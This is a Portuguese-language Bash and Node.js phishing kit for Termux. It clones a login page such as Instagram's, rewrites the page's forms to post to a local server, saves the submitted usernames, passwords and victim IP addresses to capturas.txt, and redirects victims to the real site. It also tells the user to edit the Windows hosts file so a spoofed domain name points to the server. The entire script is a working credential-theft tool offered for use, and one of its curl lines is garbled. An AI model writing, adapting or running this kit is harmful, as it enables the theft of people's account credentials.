#!/bin/bash
# ============================================
# 🎣 PHISH LOCAL - Termux Edition
# Sem root | Sem dominio pago | So funciona na rede local
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

clear
echo -e "${PURPLE}"
echo "�═══════════════════════════════════════════════╗"
echo "║         🎣 PHISH LOCAL - Termux Edition       ║"
echo "║         Sem root | Sem domínio pago           ║"
echo "╚═══════════════════════════════════════════════╝"
echo -e "${NC}"

# --- CONFIG ---
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
SERVER_FILE="$SCRIPT_DIR/server/server.js"
PORT=8080

mkdir -p "$SITE_DIR" "$SCRIPT_DIR/server"

# --- FUNCOES ---
get_ip() {
    local ip=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -z "$ip" ] && ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    echo "$ip"
}

check_node() {
    if ! command -v node &>/dev/null; then
        echo -e "${YELLOW}[...] Instalando Node.js...${NC}"
        pkg install nodejs -y >/dev/null 2>&1
    fi
}

# --- PASSO 1: PEDIR URL DO SITE ---
echo -e "${CYAN}[1/3] Qual site você quer clonar?${NC}"
echo -e "${YELLOW}    Ex: https://instagram.com${NC}"
echo ""
read -p "    👉 " TARGET_URL

# Adicionar https se nao tiver
[[ ! "$TARGET_URL" =~ ^https?:// ]] && TARGET_URL="https://$TARGET_URL"

# --- PASSO 2: CLONAR SITE ---
echo ""
echo -e "${CYAN}[2/3] Clonando HTML e CSS de:${NC} ${GREEN}$TARGET_URL${NC}"
echo -e "${YELLOW}    Isso pode demorar alguns segundos...${NC}"
echo ""

# Limpar site anterior
rm -rf "$SITE_DIR"/*

# Baizar pagina principal
curl -s -L -o "$SITE_DIR/index.html" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    "$TARGET_URL" 2>/dev/null

# Baizar CSS comum
curl -s -L -o "$SITE_DIR/style.css" \
    -H "User-Agent: Mozilla/5.0" \
    "${TARGET_URL}/static/css/style.css" 2>/dev/null

curl -s -L -o "$SITE_DIR/main.css" \
    -H "User-Agent: Mozilla/5.0" \
    "${TARGET_URL}/static/css/main.css" 2>/dev/null

# Extrair recursos da pagina
for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
    if [[ "$css" =~ ^http ]]; then
        curl -s -L -o "$SITE_DIR/$(basename "$css")" "$css" 2>/dev/null
    elif [[ "$css" =~ ^/ ]]; then
        BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
        curl -s -L -o "$SITE_DIR/$(basename "$css")" "$BASE$css" 2>/dev/null
    fi
done

for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
    if [[ "$js" =~ ^http ]]; thens -L -o "$SITE_DIR/$(basename "$js")" "$js" 2>/dev/null
    elif [[ "$js" =~ ^/ ]]; then
        BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
        curl -s -L -o "$SITE_DIR/$(basename "$js")" "$BASE$js" 2>/dev/null
    fi
done

# Modificar formularios para captura
sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"

# Verificar se clonou
if [ ! -f "$SITE_DIR/index.html" ]; then
    echo -e "${RED}[ERRO] Não foi possível clonar o site. Verifique a URL.${NC}"
    exit 1
fi

echo -e "${GREEN}[✓] Site clonado com sucesso!${NC}"
ls -la "$SITE_DIR"/*.html "$SITE_DIR"/*.css 2>/dev/null

# --- PASSO 3: PEDIR LINK DO LOCALHOST ---
echo ""
echo -e "${CYAN}[3/3] Que nome/URL você quer pro localhost?${NC}"
echo -e "${YELLOW}    Ex: instagram.local, facebook.login, etc.${NC}"
echo ""
read -p "    👉 " LOCAL_NAME

# --- CRIAR SERVIDOR ---
cat > "$SERVER_FILE" << 'SERVEREOF'
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;
const SITE_DIR = process.env.SITE_DIR || path.join(__dirname, '..', 'site_clone');
const LOG_FILE = process.env.LOG_FILE || path.join(__dirname, '..', 'capturas.txt');
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://instagram.com';

const MIME_TYPES = {
    '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript',
    '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
    '.gif': 'image/gif', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
    '.woff': 'font/woff', '.woff2': 'font/woff2', '.ttf': 'font/ttf',
};

function captureCredentials(body, clientIP) {
    const timestamp = new Date().toISOString().replace('T', ' ').split('.')[0];
    const params = new URLSearchParams(body);
    const data = {};
    for (let [key, value] of params.entries()) {
        data[key] = value;
    }
    const logEntry = `[${timestamp}] IP: ${clientIP} | Dados: ${JSON.stringify(data)}\n`;
    fs.appendFileSync(LOG_FILE, logEntry);
    console.log('\n[CAPTURADO]');
    console.log(logEntry);
}

const server = http.createServer((req, res) => {
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            captureCredentials(body, clientIP);
            res.writeHead(302, { 'Location': REDIRECT_URL });
            res.end();
        });
        return;
    }

    let filePath = req.url === '/' ? '/index.html' : req.url.split('?')[0];
    filePath = path.join(SITE_DIR, filePath);

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    fs.readFile(filePath, (err, data) => {
        if (err) {
            const fallbackHTML = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Login</title>
<style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border:1px solid #dbdbdb;padding:40px;width:350px;text-align:center}
h1{margin-bottom:30px;font-weight:400}input{width:100%;padding:12px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;box-sizing:border-box}
button{width:100%;padding:10px;margin-top:15px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:bold;font-size:14px;cursor:pointer}
button:hover{background:#1877f2}</style></head><body>
<div class="box"><h1>Login</h1><form method="POST" action="/login">
<input type="text" name="username" placeholder="Usuário ou Email" required>
<input type="password" name="password" placeholder="Senha" required>
<button type="submit">Entrar</button></form></div></body></html>`;
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(fallbackHTML);
            return;
        }
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(data);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
SERVEREOF

# --- PEDIR URL DE REDIRECIONAMENTO ---
echo ""
echo -e "${CYAN}[?] Pra onde a pessoa vai depois de logar?${NC}"
echo -e "${YELLOW}    (geralmente o site original)${NC}"
read -p "    👉 " REDIRECT_URL

[[ ! "$REDIRECT_URL" =~ ^https?:// ]] && REDIRECT_URL="https://$REDIRECT_URL"

# --- INICIAR SERVIDOR ---
IP=$(get_ip)

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║         🎣 SERVIDOR PRONTO!                  ║${NC}"
echo -e "${GREEN}╠═══════════════════════════════════════════════�${NC}"
echo -e "${GREEN}║                                               ║${NC}"
echo -e "${GREEN}║  🔥 URL DO SERVIDOR:                         ║${NC}"
echo -e "${GREEN}║     http://${IP}:${PORT}                    ║${NC}"
echo -e "${GREEN}║                                               ║${NC}"
echo -e "${YELLOW}║  📝 No PC (Windows), edite o hosts:          ║${NC}"
echo -e "${YELLOW}║     C:\\Windows\\System32\\drivers\\etc\\hosts     ║${NC}"
echo -e "${YELLOW}║                                               ║${NC}"
echo -e "${YELLOW}║  Adicione:                                    ║${NC}"
echo -e "${YELLOW}║     ${IP}  ${LOCAL_NAME}                  ║${NC}"
echo -e "${GREEN}║                                               ║${NC}"
echo -e "${GREEN}║  Agora acesse:                                ║${NC}"
echo -e "${GREEN}║     http://${LOCAL_NAME}:${PORT}              ║${NC}"
echo -e "${GREEN}║                                               ║${NC}"
echo -e "${GREEN}╠═══════════════════════════════════════════════╣${NC}"
echo -e "${RED}║  📁 Dados salvos em: capturas.txt            ║${NC}"
echo -e "${GREEN}�═══════════════════════════════════════════════╝${NC}"
echo ""

# Salvar configuracao
echo "TARGET_URL=$TARGET_URL" > "$SCRIPT_DIR/.config"
echo "REDIRECT_URL=$REDIRECT_URL" >> "$SCRIPT_DIR/.config"
echo "LOCAL_NAME=$LOCAL_NAME" >> "$SCRIPT_DIR/.config"
echo "PORT=$PORT" >> "$SCRIPT_DIR/.config"

# Iniciar servidor
echo -e "${GREEN}[✓] Iniciando servidor...${NC}"
echo -e "${YELLOW}[*] Pressione Ctrl+C para parar${NC}"
echo ""

REDIRECT_URL="$REDIRECT_URL" PORT="$PORT" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SERVER_FILE"

# Ao parar
echo ""
echo -e "${YELLOW}[*] Servidor parado.${NC}"
echo -e "${CYAN}[?] Ver capturas? (s/n)${NC}"
read -p "> " SHOW_CAPS
if [ "$SHOW_CAPS" = "s" ] || [ "$SHOW_CAPS" = "S" ]; then
    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
    if [ -f "$LOG_FILE" ]; then
        cat "$LOG_FILE"
    else
        echo -e "${YELLOW}Nenhuma captura ainda.${NC}"
    fi
    echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
fi
